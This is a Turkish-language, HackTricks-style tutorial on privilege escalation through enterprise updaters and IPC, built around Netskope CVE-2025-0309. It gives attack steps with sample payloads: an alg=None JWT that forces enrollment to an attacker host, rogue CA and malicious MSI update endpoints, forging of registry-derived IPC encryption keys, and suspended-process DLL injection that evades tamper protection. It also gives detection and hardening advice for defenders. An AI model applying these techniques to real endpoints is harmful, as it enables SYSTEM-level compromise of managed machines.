# Kurumsal Otomatik Güncelleyicilerin ve Ayrıcalıklı IPC'nin Kötüye Kullanımı (ör. Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük sürtünmeli bir IPC yüzeyi ve ayrıcalıklı bir güncelleme akışı açığa çıkaran kurumsal endpoint ajanlarında ve updaters'larda bulunan Windows local privilege escalation zincirlerinin bir sınıfını genelleştirir. Temsili bir örnek, düşük ayrıcalıklı bir kullanıcının kaydı saldırgan kontrolündeki bir sunucuya zorlayabileceği ve ardından SYSTEM servisi tarafından kurulacak kötü niyetli bir MSI teslim edebileceği Netskope Client for Windows < R129 (CVE-2025-0309) durumudur.

Benzer ürünlere karşı tekrar kullanabileceğiniz temel fikirler:
- Ayrıcalıklı bir servisin localhost IPC'sini, yeniden kayıt veya yeniden yapılandırmayı saldırgan sunucuya zorlamak için kötüye kullanın.
- Vendor’ın update endpoint'lerini uygulayın, kötü niyetli bir Trusted Root CA teslim edin ve updater'ı kötü niyetli, “signed” bir pakete yönlendirin.
- Zayıf signer kontrollerinden (CN allow‑lists), isteğe bağlı digest bayraklarından ve gevşek MSI özelliklerinden kaçının.
- Eğer IPC “encrypted” ise, key/IV'yi registry'de saklanan ve herkesin okuyabildiği makine tanımlayıcılarından türetin.
- Servis çağıranları image path/process name ile kısıtlıyorsa, allow‑listed bir sürece inject edin veya bir tane suspended olarak spawn edip minimal bir thread‑context patch ile DLL'inizi bootstrap edin.

---
## 1) localhost IPC üzerinden saldırgan sunucuya kayıt zorlamak

Birçok ajan, JSON kullanarak localhost TCP üzerinden bir SYSTEM servisiyle konuşan user‑mode bir UI process ile gelir.

Netskope'ta gözlemlendi:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend host'u kontrol eden claim'lere (ör. AddonUrl) sahip bir JWT enrollment token oluşturun. alg=None kullanın böylece imza gerekmeyecektir.
2) JWT'niz ve tenant adı ile provisioning komutunu çağıran IPC mesajını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için sahte sunucunuza istek göndermeye başlar, örneğin:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer çağıran doğrulaması path/name‑bazlıysa, isteği allow‑listed bir vendor binary'den başlatın (bkz. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

İstemci sunucunuzla iletişim kurduktan sonra, beklenen endpoints'leri uygulayın ve onu saldırgan MSI'sine yönlendirin. Tipik sıralama:

1) /v2/config/org/clientconfig → JSON konfigürasyonunu çok kısa bir güncelleme aralığıyla döndürün, örneğin:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA sertifikası döndürür. Servis bunu Local Machine Trusted Root deposuna yükler.
3) /v2/checkupdate → Zararlı bir MSI'ya ve sahte bir sürüme işaret eden metadata sağlar.

Gerçek dünyada görülen yaygın kontrollerin atlatılması:
- Signer CN allow‑list: servis yalnızca Subject CN'nin “netSkope Inc” veya “Netskope, Inc.” olup olmadığını kontrol edebilir. Kötü niyetli CA'nız bu CN ile bir leaf sertifikası verebilir ve MSI'yı imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI özelliği ekleyin. Kurulum sırasında uygulanmıyor.
- Optional digest enforcement: config bayrağı (ör., check_msi_digest=false) ek kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI'nızı C:\ProgramData\Netskope\stAgent\data\*.msi konumundan kurar ve NT AUTHORITY\SYSTEM olarak rastgele kod çalıştırır.

---
## 3) Forging encrypted IPC requests (when present)

R127'den itibaren, Netskope IPC JSON'u Base64 görünen encryptData alanına sardı. Tersine mühendislik, AES'in key/IV'nin herhangi bir kullanıcı tarafından okunabilen registry değerlerinden türetildiğini gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi çoğaltıp normal bir kullanıcıdan geçerli şifreli komutlar gönderebilir. Genel ipucu: bir agent aniden “encrypts” its IPC ise, malzeme olarak HKLM altında device ID'leri, product GUID'leri, install ID'leri arayın.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Bazı servisler TCP bağlantısının PID'sini çözerek eş tarafı doğrulamaya çalışır ve image path/name'i Program Files altında izin listesinde olan vendor binary'lerle karşılaştırır (örn., stagentui.exe, bwansvc.exe, epdlp.exe).

İki pratik atlatma yöntemi:
- Allow‑list'lenmiş bir sürece (örn. nsdiag.exe) DLL injection yapıp onun içinden IPC'yi proxy'lemek.
- Izin listesinde olan bir binary'yi suspended olarak başlatıp CreateRemoteThread kullanmadan proxy DLL'inizi bootstrap ederek driver tarafından uygulanan tahrif kurallarını karşılamak (bkz. §5).

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Ürünler genellikle korumalı süreçlerin handle'larından tehlikeli hakları kaldırmak için minifilter/OB callbacks içeren bir driver (örn. Stadrv) ile gelir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlar

Bu kısıtlamalara saygı gösteren güvenilir bir user‑mode loader:
1) Vendor binary için CREATE_SUSPENDED ile CreateProcess çağrısı.
2) Hâlâ elde edebildiğiniz handle'ları alın: process üzerinde PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve bir thread handle'ı için THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya kodu bilinen bir RIP'te patchliyorsanız sadece THREAD_RESUME).
3) ntdll!NtContinue (veya başka erken, garantili‑mapped thunk) üzerine, DLL yolunuzda LoadLibraryW çağıran ve sonra geri atlayan küçük bir stub yazın.
4) ResumeThread ile stub'unuzun süreç içinde tetiklenmesini sağlayın ve DLL'inizi yükleyin.

Zaten korumalı bir süreç üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (süreci siz oluşturduğunuzdan), driver politikası sağlanmış olur.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) kötü niyetli bir CA, zararlı MSI imzalama ve gereken endpoint'leri otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope, rastgele (isteğe bağlı olarak AES‑encrypted) IPC mesajları oluşturan ve izin listesinde olan bir binary'den başlayacak şekilde suspended‑process injection içeren özel bir IPC client'tır.

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root'a eklemeleri izleyin. Sysmon + registry‑mod eventing (bkz. SpecterOps rehberliği) iyi çalışır.
- Agent servisinin C:\ProgramData\<vendor>\<agent>\data\*.msi gibi yollarından başlattığı MSI yürütmelerini işaretleyin.
- Beklenmeyen enrollment hostları/tenant'lar için agent log'larını gözden geçirin, örn.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant anomalilerine ve provisioning msg 148'e bakın.
- Beklenen imzalı binary'ler olmayan veya sıra dışı child process ağaçlarından kaynaklanan localhost IPC istemcileri için alarm oluşturun.

---
## Hardening tips for vendors
- Enrollment/update hostlarını sıkı bir allow‑list'e bağlayın; clientcode içinde güvenilmeyen domainleri reddedin.
- IPC eşlerini image path/name kontrolleri yerine OS primitive'ları ile doğrulayın (ALPC security, named‑pipe SIDs).
- Gizli materyali world‑readable HKLM'den uzak tutun; IPC şifrelenmesi gerekiyorsa anahtarları korunmuş sırlar üzerinden türetin veya kimlik doğrulanmış kanallar üzerinden pazarlık (negotiate) yapın.
- Updater'ı bir supply‑chain yüzeyi olarak ele alın: kontrolünü elinizde tuttuğunuz güvenilen bir CA'ya tam zincir gerektirin, paket imzalarını pinned anahtarlar ile doğrulayın ve config'te doğrulama devre dışıysa kapatın (fail closed).

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
